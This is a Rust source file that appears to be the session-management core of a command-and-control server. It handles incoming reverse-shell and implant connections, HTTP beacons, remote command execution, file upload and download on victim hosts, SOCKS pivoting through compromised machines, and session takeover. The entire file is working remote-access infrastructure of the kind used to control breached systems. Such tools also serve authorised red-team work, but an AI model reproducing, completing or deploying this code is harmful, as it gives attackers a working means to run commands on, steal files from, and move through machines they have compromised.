use bytes::BytesMut;
use futures_util::{SinkExt, StreamExt};
use serde::{Deserialize, Serialize};
use std::collections::HashMap;
use std::pin::Pin;
use std::sync::Arc;
use std::task::{Context, Poll};
use std::time::Instant;
use tokio::io::{AsyncRead, AsyncWrite, ReadBuf};
use tokio::net::TcpStream;
use tokio::sync::{Mutex, mpsc, oneshot};
use tokio_util::codec::Framed;
use tracing::{debug, info, warn};

use crate::protocol::{Frame, FrameType, GleipnirCodec};
use crate::socks::SocksConnection;
use crate::ws::{EventBus, SessionEvent};

pub enum BoxedStream {
    Tcp(TcpStream),
    #[cfg(feature = "tls")]
    Tls(Box<tokio_rustls::server::TlsStream<TcpStream>>),
}

impl AsyncRead for BoxedStream {
    fn poll_read(
        self: Pin<&mut Self>,
        cx: &mut Context<'_>,
        buf: &mut ReadBuf<'_>,
    ) -> Poll<std::io::Result<()>> {
        match self.get_mut() {
            BoxedStream::Tcp(s) => Pin::new(s).poll_read(cx, buf),
            #[cfg(feature = "tls")]
            BoxedStream::Tls(s) => Pin::new(s).poll_read(cx, buf),
        }
    }
}

impl AsyncWrite for BoxedStream {
    fn poll_write(
        self: Pin<&mut Self>,
        cx: &mut Context<'_>,
        buf: &[u8],
    ) -> Poll<std::io::Result<usize>> {
        match self.get_mut() {
            BoxedStream::Tcp(s) => Pin::new(s).poll_write(cx, buf),
            #[cfg(feature = "tls")]
            BoxedStream::Tls(s) => Pin::new(s).poll_write(cx, buf),
        }
    }

    fn poll_flush(self: Pin<&mut Self>, cx: &mut Context<'_>) -> Poll<std::io::Result<()>> {
        match self.get_mut() {
            BoxedStream::Tcp(s) => Pin::new(s).poll_flush(cx),
            #[cfg(feature = "tls")]
            BoxedStream::Tls(s) => Pin::new(s).poll_flush(cx),
        }
    }

    fn poll_shutdown(self: Pin<&mut Self>, cx: &mut Context<'_>) -> Poll<std::io::Result<()>> {
        match self.get_mut() {
            BoxedStream::Tcp(s) => Pin::new(s).poll_shutdown(cx),
            #[cfg(feature = "tls")]
            BoxedStream::Tls(s) => Pin::new(s).poll_shutdown(cx),
        }
    }
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct SessionInfo {
    pub name: String,
    pub os: String,
    pub arch: String,
    pub hostname: String,
    pub username: String,
    pub pid: u32,
    pub cwd: String,
    pub connected: bool,
    pub mode: String,
    #[serde(skip, default = "Instant::now")]
    pub last_seen: Instant,
}

#[derive(Debug, Deserialize)]
pub struct PlatformInfo {
    pub os: String,
    pub arch: String,
    pub hostname: String,
    pub username: String,
    pub pid: u32,
    pub cwd: String,
    #[serde(default)]
    pub session_id: Option<String>,
}

pub enum SessionCommand {
    Exec {
        command: String,
        timeout_secs: u64,
        reply: oneshot::Sender<Result<Vec<u8>, String>>,
    },
    FileUp {
        data: Vec<u8>,
        remote_path: String,
        reply: oneshot::Sender<Result<(), String>>,
    },
    FileDown {
        remote_path: String,
        reply: oneshot::Sender<Result<Vec<u8>, String>>,
    },
    SendFrame(Frame),
}

pub(crate) struct ActiveSession {
    pub(crate) info: SessionInfo,
    pub(crate) cmd_tx: mpsc::Sender<SessionCommand>,
    pub(crate) socks_connections: Arc<Mutex<HashMap<u32, SocksConnection>>>,
}

type HttpPendingMap = Arc<Mutex<HashMap<(String, u32), oneshot::Sender<Result<Vec<u8>, String>>>>>;

pub struct SessionManager {
    sessions: Arc<Mutex<HashMap<String, ActiveSession>>>,
    next_id: Arc<Mutex<u32>>,
    event_bus: Option<Arc<EventBus>>,
    http_pending: HttpPendingMap,
    http_next_task_id: Arc<Mutex<u32>>,
}

impl SessionManager {
    pub fn new() -> Self {
        Self {
            sessions: Arc::new(Mutex::new(HashMap::new())),
            next_id: Arc::new(Mutex::new(1)),
            event_bus: None,
            http_pending: Arc::new(Mutex::new(HashMap::new())),
            http_next_task_id: Arc::new(Mutex::new(1)),
        }
    }

    pub fn with_event_bus(mut self, bus: Arc<EventBus>) -> Self {
        self.event_bus = Some(bus);
        self
    }

    fn emit(&self, event: SessionEvent) {
        if let Some(ref bus) = self.event_bus {
            bus.emit(event);
        }
    }

    pub fn sessions_ref(&self) -> &Arc<Mutex<HashMap<String, ActiveSession>>> {
        &self.sessions
    }

    pub async fn handle_raw_connection(
        &self,
        mut stream: TcpStream,
        peer: std::net::SocketAddr,
        name_prefix: String,
    ) {
        info!("new raw TCP connection from {peer}");

        let shell_info = crate::session_raw::probe_and_upgrade(&mut stream).await;

        let base = if name_prefix.is_empty() {
            shell_info.hostname.to_lowercase()
        } else {
            format!("{}-{}", name_prefix, shell_info.hostname).to_lowercase()
        };
        let name = self.generate_name_base(&base).await;

        info!(
            "raw session '{name}' registered: {}@{} (uid={})",
            shell_info.username, shell_info.hostname, shell_info.uid
        );

        let (cmd_tx, cmd_rx) = mpsc::channel::<SessionCommand>(32);

        let session_info = SessionInfo {
            name: name.clone(),
            os: if shell_info.windows { "windows" } else { "unknown" }.to_string(),
            arch: "unknown".to_string(),
            hostname: shell_info.hostname,
            username: shell_info.username,
            pid: 0,
            cwd: String::new(),
            connected: true,
            mode: "raw".to_string(),
            last_seen: Instant::now(),
        };

        {
            let mut sessions = self.sessions.lock().await;
            sessions.insert(
                name.clone(),
                ActiveSession {
                    info: session_info,
                    cmd_tx,
                    socks_connections: Arc::new(Mutex::new(HashMap::new())),
                },
            );
        }

        self.emit(SessionEvent::new_session(&name, "raw", &format!("{peer}")));
        crate::session_raw::raw_session_loop(stream, cmd_rx, shell_info.windows).await;

        {
            let mut sessions = self.sessions.lock().await;
            if let Some(s) = sessions.get_mut(&name) {
                s.info.connected = false;
            }
        }
        self.emit(SessionEvent::session_closed(&name, "disconnected"));
        info!("raw session '{name}' disconnected");
    }

    pub async fn handle_connection(&self, stream: BoxedStream, peer: std::net::SocketAddr) {
        info!("new connection from {peer}");
        let mut framed = Framed::new(stream, GleipnirCodec);

        let platform = match framed.next().await {
            Some(Ok(frame)) if frame.frame_type == FrameType::InfoResponse => {
                match serde_json::from_slice::<PlatformInfo>(&frame.payload) {
                    Ok(info) => info,
                    Err(e) => {
                        warn!("bad platform info from {peer}: {e}");
                        return;
                    }
                }
            }
            Some(Ok(f)) => {
                warn!("expected InfoResponse, got {:?} from {peer}", f.frame_type);
                return;
            }
            Some(Err(e)) => {
                warn!("frame error from {peer}: {e}");
                return;
            }
            None => {
                warn!("connection closed before info from {peer}");
                return;
            }
        };

        // Resolve session name: use session_id if provided, otherwise generate from hostname
        let name = if let Some(ref sid) = platform.session_id {
            sid.clone()
        } else {
            self.generate_name(&platform).await
        };

        // Check for session resume
        let resumed = if platform.session_id.is_some() {
            let mut sessions = self.sessions.lock().await;
            if let Some(existing) = sessions.get_mut(&name) {
                if existing.info.connected {
                    let age = existing.info.last_seen.elapsed();
                    warn!(
                        "session '{name}' takeover: disconnecting old connection (last seen {age:.1?} ago)"
                    );
                    let (new_tx, _) = mpsc::channel::<SessionCommand>(32);
                    existing.cmd_tx = new_tx;
                }
                true
            } else {
                false
            }
        } else {
            false
        };

        if resumed {
            info!(
                "session '{name}' resumed: {} {} {}@{}",
                platform.os, platform.arch, platform.username, platform.hostname
            );
        } else {
            info!(
                "session '{name}' registered: {} {} {}@{}",
                platform.os, platform.arch, platform.username, platform.hostname
            );
        }

        let (cmd_tx, cmd_rx) = mpsc::channel::<SessionCommand>(32);
        let socks_connections: Arc<Mutex<HashMap<u32, SocksConnection>>> =
            Arc::new(Mutex::new(HashMap::new()));

        let session_info = SessionInfo {
            name: name.clone(),
            os: platform.os,
            arch: platform.arch,
            hostname: platform.hostname.clone(),
            username: platform.username,
            pid: platform.pid,
            cwd: platform.cwd,
            connected: true,
            mode: "agent".to_string(),
            last_seen: Instant::now(),
        };

        {
            let mut sessions = self.sessions.lock().await;
            sessions.insert(
                name.clone(),
                ActiveSession {
                    info: session_info,
                    cmd_tx,
                    socks_connections: socks_connections.clone(),
                },
            );
        }

        self.emit(SessionEvent::new_session(
            &name,
            "agent",
            &format!("{peer}"),
        ));
        self.session_loop(&name, framed, cmd_rx, socks_connections)
            .await;

        {
            let mut sessions = self.sessions.lock().await;
            if let Some(s) = sessions.get_mut(&name) {
                s.info.connected = false;
            }
        }
        self.emit(SessionEvent::session_closed(&name, "disconnected"));
        info!("session '{name}' disconnected");
    }

    async fn session_loop(
        &self,
        name: &str,
        mut framed: Framed<BoxedStream, GleipnirCodec>,
        mut cmd_rx: mpsc::Receiver<SessionCommand>,
        socks_connections: Arc<Mutex<HashMap<u32, SocksConnection>>>,
    ) {
        let mut request_counter = {
            let mut id = self.next_id.lock().await;
            let v = *id;
            *id = id.wrapping_add(1000);
            v
        };

        // Pending response waiters keyed by request_id
        let mut pending: HashMap<u32, oneshot::Sender<Result<Vec<u8>, String>>> = HashMap::new();
        let (timeout_tx, mut timeout_rx) = mpsc::channel::<u32>(64);
        let mut heartbeat = tokio::time::interval(std::time::Duration::from_secs(5));
        heartbeat.set_missed_tick_behavior(tokio::time::MissedTickBehavior::Delay);

        loop {
            tokio::select! {
                // Heartbeat: detect dead connections
                _ = heartbeat.tick() => {
                    request_counter += 1;
                    if framed.send(Frame::ping(request_counter)).await.is_err() {
                        warn!("heartbeat failed for '{name}', disconnecting");
                        break;
                    }
                }

                // Timeout expiry: remove pending request and respond with error
                Some(rid) = timeout_rx.recv() => {
                    if let Some(reply) = pending.remove(&rid) {
                        let _ = reply.send(Err("command timed out".into()));
                    }
                }

                Some(cmd) = cmd_rx.recv() => {
                    request_counter += 1;
                    match cmd {
                        SessionCommand::Exec { command, timeout_secs, reply } => {
                            let rid = request_counter;
                            let frame = Frame::cmd(rid, &command);
                            if framed.send(frame).await.is_err() {
                                let _ = reply.send(Err("send failed".into()));
                                break;
                            }
                            pending.insert(rid, reply);

                            let ttx = timeout_tx.clone();
                            tokio::spawn(async move {
                                tokio::time::sleep(std::time::Duration::from_secs(timeout_secs)).await;
                                let _ = ttx.send(rid).await;
                            });
                        }
                        SessionCommand::FileUp { data, remote_path, reply } => {
                            let rid = request_counter;
                            let mut payload = BytesMut::new();
                            let path_bytes = remote_path.as_bytes();
                            payload.extend_from_slice(&(path_bytes.len() as u32).to_be_bytes());
                            payload.extend_from_slice(path_bytes);
                            payload.extend_from_slice(&data);
                            let frame = Frame::new(FrameType::FileUp, rid, payload);
                            if framed.send(frame).await.is_err() {
                                let _ = reply.send(Err("send failed".into()));
                                break;
                            }
                            // Wrap the reply to convert Vec<u8> -> ()
                            let (inner_tx, inner_rx) = oneshot::channel();
                            pending.insert(rid, inner_tx);
                            tokio::spawn(async move {
                                match inner_rx.await {
                                    Ok(Ok(_)) => { let _ = reply.send(Ok(())); }
                                    Ok(Err(e)) => { let _ = reply.send(Err(e)); }
                                    Err(_) => { let _ = reply.send(Err("dropped".into())); }
                                }
                            });
                        }
                        SessionCommand::FileDown { remote_path, reply } => {
                            let rid = request_counter;
                            let frame = Frame::new(
                                FrameType::FileDown,
                                rid,
                                BytesMut::from(remote_path.as_bytes()),
                            );
                            if framed.send(frame).await.is_err() {
                                let _ = reply.send(Err("send failed".into()));
                                break;
                            }
                            pending.insert(rid, reply);
                        }
                        SessionCommand::SendFrame(frame) => {
                            if framed.send(frame).await.is_err() {
                                break;
                            }
                        }
                    }
                }

                Some(result) = framed.next() => {
                    match result {
                        Ok(frame) => {
                            // Update last_seen
                            {
                                let mut sessions = self.sessions.lock().await;
                                if let Some(s) = sessions.get_mut(name) {
                                    s.info.last_seen = Instant::now();
                                }
                            }

                            match frame.frame_type {
                                FrameType::Ping => {
                                    if framed.send(Frame::pong(frame.request_id)).await.is_err() {
                                        break;
                                    }
                                }

                                FrameType::CmdOutput | FrameType::FileDown => {
                                    if let Some(reply) = pending.remove(&frame.request_id) {
                                        let _ = reply.send(Ok(frame.payload.to_vec()));
                                    }
                                }

                                FrameType::Error => {
                                    if let Some(reply) = pending.remove(&frame.request_id) {
                                        let msg = frame.payload_as_str()
                                            .unwrap_or("unknown error").to_string();
                                        let _ = reply.send(Err(msg));
                                    }
                                }

                                // SOCKS frames from agent: route to the right client
                                FrameType::SocksData => {
                                    let tx = {
                                        let conns = socks_connections.lock().await;
                                        conns.get(&frame.request_id).map(|c| c.relay_data_tx.clone())
                                    };
                                    if let Some(tx) = tx {
                                        let _ = tx.send(frame.payload.to_vec()).await;
                                    }
                                }

                                FrameType::SocksClose => {
                                    socks_connections.lock().await.remove(&frame.request_id);
                                }

                                FrameType::SocksOpen => {
                                    let ack_tx = {
                                        let mut conns = socks_connections.lock().await;
                                        conns.get_mut(&frame.request_id)
                                            .and_then(|c| c.connect_ack.take())
                                    };
                                    if let Some(tx) = ack_tx {
                                        let ok = frame.payload_as_str() == Some("ok");
                                        let _ = tx.send(ok);
                                    }
                                    debug!("socks open ack for {}", frame.request_id);
                                }

                                _ => {
                                    debug!("unhandled frame from '{name}': {:?}", frame.frame_type);
                                }
                            }
                        }
                        Err(e) => {
                            warn!("frame error from '{name}': {e}");
                            break;
                        }
                    }
                }

                else => break,
            }
        }

        // Clean up pending requests
        for (_, reply) in pending.drain() {
            let _ = reply.send(Err("session disconnected".into()));
        }

        // Clean up SOCKS connections so clients get a clean disconnect
        socks_connections.lock().await.clear();
    }

    async fn generate_name(&self, platform: &PlatformInfo) -> String {
        self.generate_name_base(&platform.hostname).await
    }

    async fn generate_name_base(&self, hostname: &str) -> String {
        let sessions = self.sessions.lock().await;
        let base = hostname.to_lowercase();
        if !sessions.contains_key(&base) {
            return base;
        }
        for i in 2.. {
            let name = format!("{base}-{i}");
            if !sessions.contains_key(&name) {
                return name;
            }
        }
        unreachable!()
    }

    pub async fn exec(
        &self,
        session: &str,
        command: &str,
        timeout_secs: u64,
    ) -> Result<Vec<u8>, String> {
        let tx = self.get_tx(session).await?;
        let (reply_tx, reply_rx) = oneshot::channel();
        tx.send(SessionCommand::Exec {
            command: command.to_string(),
            timeout_secs,
            reply: reply_tx,
        })
        .await
        .map_err(|_| "session channel closed".to_string())?;
        reply_rx
            .await
            .map_err(|_| "session dropped reply".to_string())?
    }

    pub async fn upload(
        &self,
        session: &str,
        data: Vec<u8>,
        remote_path: &str,
    ) -> Result<(), String> {
        let tx = self.get_tx(session).await?;
        let (reply_tx, reply_rx) = oneshot::channel();
        tx.send(SessionCommand::FileUp {
            data,
            remote_path: remote_path.to_string(),
            reply: reply_tx,
        })
        .await
        .map_err(|_| "session channel closed".to_string())?;
        reply_rx
            .await
            .map_err(|_| "session dropped reply".to_string())?
    }

    pub async fn download(&self, session: &str, remote_path: &str) -> Result<Vec<u8>, String> {
        let tx = self.get_tx(session).await?;
        let (reply_tx, reply_rx) = oneshot::channel();
        tx.send(SessionCommand::FileDown {
            remote_path: remote_path.to_string(),
            reply: reply_tx,
        })
        .await
        .map_err(|_| "session channel closed".to_string())?;
        reply_rx
            .await
            .map_err(|_| "session dropped reply".to_string())?
    }

    pub async fn get_socks_connections(
        &self,
        session: &str,
    ) -> Result<Arc<Mutex<HashMap<u32, SocksConnection>>>, String> {
        let sessions = self.sessions.lock().await;
        let s = sessions
            .get(session)
            .ok_or_else(|| format!("session '{session}' not found"))?;
        Ok(s.socks_connections.clone())
    }

    pub async fn list_sessions(&self) -> Vec<SessionInfo> {
        let sessions = self.sessions.lock().await;
        sessions.values().map(|s| s.info.clone()).collect()
    }

    pub async fn get_session(&self, name: &str) -> Option<SessionInfo> {
        let sessions = self.sessions.lock().await;
        sessions.get(name).map(|s| s.info.clone())
    }

    pub async fn kill_session(&self, name: &str) -> Result<(), String> {
        let mut sessions = self.sessions.lock().await;
        match sessions.remove(name) {
            Some(_) => Ok(()),
            None => Err(format!("session '{name}' not found")),
        }
    }

    pub async fn rename_session(&self, old: &str, new: &str) -> Result<SessionInfo, String> {
        let mut sessions = self.sessions.lock().await;
        if sessions.contains_key(new) {
            return Err(format!("session '{new}' already exists"));
        }
        let mut active = sessions
            .remove(old)
            .ok_or_else(|| format!("session '{old}' not found"))?;
        active.info.name = new.to_string();
        let info = active.info.clone();
        sessions.insert(new.to_string(), active);
        Ok(info)
    }

    pub async fn get_frame_sender(&self, session: &str) -> Result<mpsc::Sender<Frame>, String> {
        let tx = self.get_tx(session).await?;
        let (frame_tx, mut frame_rx) = mpsc::channel::<Frame>(256);
        tokio::spawn(async move {
            while let Some(frame) = frame_rx.recv().await {
                if tx.send(SessionCommand::SendFrame(frame)).await.is_err() {
                    break;
                }
            }
        });
        Ok(frame_tx)
    }

    pub async fn register_http_session(
        &self,
        platform: PlatformInfo,
    ) -> Result<(String, mpsc::Receiver<SessionCommand>), String> {
        let name = if let Some(ref sid) = platform.session_id {
            sid.clone()
        } else {
            self.generate_name(&platform).await
        };

        let (cmd_tx, cmd_rx) = mpsc::channel::<SessionCommand>(32);

        let session_info = SessionInfo {
            name: name.clone(),
            os: platform.os,
            arch: platform.arch,
            hostname: platform.hostname,
            username: platform.username,
            pid: platform.pid,
            cwd: platform.cwd,
            connected: true,
            mode: "http".to_string(),
            last_seen: Instant::now(),
        };

        {
            let mut sessions = self.sessions.lock().await;
            sessions.insert(
                name.clone(),
                ActiveSession {
                    info: session_info,
                    cmd_tx,
                    socks_connections: Arc::new(Mutex::new(HashMap::new())),
                },
            );
        }

        self.emit(SessionEvent::new_session(&name, "http", "http-beacon"));
        Ok((name, cmd_rx))
    }

    pub async fn store_http_pending(
        &self,
        session: &str,
        reply: oneshot::Sender<Result<Vec<u8>, String>>,
    ) -> u32 {
        let mut id = self.http_next_task_id.lock().await;
        let task_id = *id;
        *id = id.wrapping_add(1);
        drop(id);

        self.http_pending
            .lock()
            .await
            .insert((session.to_string(), task_id), reply);
        task_id
    }

    pub async fn take_http_pending(
        &self,
        session: &str,
        task_id: u32,
    ) -> Option<oneshot::Sender<Result<Vec<u8>, String>>> {
        self.http_pending
            .lock()
            .await
            .remove(&(session.to_string(), task_id))
    }

    async fn get_tx(&self, session: &str) -> Result<mpsc::Sender<SessionCommand>, String> {
        let sessions = self.sessions.lock().await;
        let s = sessions
            .get(session)
            .ok_or_else(|| format!("session '{session}' not found"))?;
        if !s.info.connected {
            return Err(format!("session '{session}' is disconnected"));
        }
        Ok(s.cmd_tx.clone())
    }
}
